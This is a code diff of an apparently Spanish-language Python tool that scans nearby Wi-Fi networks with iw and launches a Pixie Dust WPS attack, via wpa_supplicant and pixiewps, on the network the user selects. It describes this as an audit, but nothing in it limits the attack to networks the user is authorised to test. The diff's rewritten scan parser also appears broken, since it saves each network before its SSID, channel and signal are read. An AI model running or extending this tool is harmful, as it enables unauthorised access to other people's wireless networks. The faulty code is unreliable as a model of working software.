@@ -32,25 +32,30 @@ def scan_wifi(interface):
     print(f"Escaneando redes Wi-Fi en la interfaz {interface}...")
     resultado, _ = run_command(f"iw dev {interface} scan", use_sudo=True)
     redes = []
-    bssids = []
-    canales = []
-    intensidades = []
-    for linea in resultado.split('\n'):
+    red_actual = {}
+    
+    for linea in resultado.split("\n"):
         if "SSID" in linea:
-            essid = linea.split(':', 1)[1].strip()
-            redes.append(essid)
+            ssid = linea.split(":", 1)[1].strip()
+            red_actual["SSID"] = ssid
         if "BSS" in linea:
-            bssid = linea.split()[1].split('(')[0]
+            bssid = linea.split()[1].split("(")[0]
             if is_valid_bssid(bssid):
-                bssids.append(bssid)
+                red_actual["BSSID"] = bssid
         if "freq:" in linea:
-            freq = linea.split(':', 1)[1].strip()
+            freq = linea.split(":", 1)[1].strip()
             canal = freq_to_channel(freq)
-            canales.append(canal)
+            red_actual["Channel"] = canal
         if "signal:" in linea:
-            intensidad = linea.split(':', 1)[1].strip()
-            intensidades.append(intensidad)
-    return redes, bssids, canales, intensidades
+            intensidad = linea.split(":", 1)[1].strip()
+            red_actual["Signal"] = intensidad
+        
+        # Agregar la red a la lista si tiene un BSSID válido y comenzar una nueva red
+        if "BSSID" in red_actual:
+            redes.append(red_actual)
+            red_actual = {}
+    
+    return redes
 
 def perform_pixie_dust_attack(interface, ssid):
     """Realiza el ataque Pixie Dust usando los datos de wpa_supplicant."""
@@ -114,48 +119,54 @@ def display_menu():
     print("-" * 50)
 
 def main():
-    """Función principal."""
+    # Limpiar la pantalla al inicio del script
+    os.system("clear")
     display_menu()
-    interface = "wlan1"  # Cambia la interfaz según sea necesario.
-    
-    # Escanear redes
-    networks = scan_wifi(interface)
-    if not networks:
-        print("\n[-] No se encontraron redes.")
-        return
 
-    # Mostrar redes en una tabla
-    headers = ["#", "SSID", "BSSID", "Canal", "Intensidad"]
-    table = [
-        [
-            i + 1,
-            n.get("SSID", "<SSID oculto>"),  # Manejo de SSID oculto
-            n["BSSID"],
-            n.get("Channel", "N/A"),
-            n.get("Signal", "N/A"),
-        ]
-        for i, n in enumerate(networks)
-    ]
-    print("\n[+] Redes disponibles:")
-    print(tabulate(table, headers, tablefmt="fancy_grid"))
-
-    # Selección de red
-    try:
-        choice = int(input("\nSelecciona una red (número): ")) - 1
-        if choice < 0 or choice >= len(networks):
-            print("\n[-] Selección inválida.")
+    # Verificar la disponibilidad de las herramientas necesarias
+    tools = ["iw", "wpa_supplicant", "pixiewps"]
+    for tool in tools:
+        if not check_tool_availability(tool):
+            print(f"Error: {tool} no está disponible en el sistema.")
             return
-    except ValueError:
-        print("\n[-] Entrada inválida.")
-        return
-    
-    selected_network = networks[choice]
-    print(f"\n[+] Red seleccionada: {selected_network.get('SSID', '<SSID oculto>')} ({selected_network['BSSID']})")
-    
-    # Intentar asociarse usando wpa_supplicant
-    output = run_wpa_supplicant(interface, selected_network.get("SSID", ""))
-    print("\n[+] Salida de wpa_supplicant:")
-    print(output)
+
+    # Utilizar la interfaz secundaria para el escaneo y el ataque
+    scan_interface = "wlan1"  # Asegúrate de que esta sea la interfaz correcta para el escaneo en tu dispositivo
+
+    # Escanear redes Wi-Fi utilizando la interfaz secundaria
+    redes = scan_wifi(scan_interface)
+    if redes:
+        print("Redes disponibles:")
+        table = []
+        for i, red in enumerate(redes):
+            table.append([
+                i + 1,
+                red.get("SSID", "<SSID oculto>"),
+                red.get("BSSID", "N/A"),
+                red.get("Channel", "N/A"),
+                red.get("Signal", "N/A"),
+            ])
+        
+        headers = ["#", "SSID", "BSSID", "Canal", "Intensidad"]
+        print(tabulate(table, headers, tablefmt="grid"))
+        
+        try:
+            seleccion = int(input("Selecciona la red que deseas auditar (número): ")) - 1
+            if seleccion < 0 or seleccion >= len(redes):
+                print("Selección inválida.")
+                return
+            red_seleccionada = redes[seleccion]
+            
+            print(f"Red seleccionada: {red_seleccionada.get('SSID', '<SSID oculto>')}")
+            print(f"BSSID: {red_seleccionada.get('BSSID', 'N/A')}")
+            print(f"Canal: {red_seleccionada.get('Channel', 'N/A')}")
+            
+            # Realizar el ataque Pixie Dust
+            perform_pixie_dust_attack(scan_interface, red_seleccionada.get("SSID", "<SSID oculto>"))
+        except ValueError:
+            print("Entrada inválida.")
+    else:
+        print("No se encontraron redes WiFi.")
 
 if __name__ == "__main__":
     main()
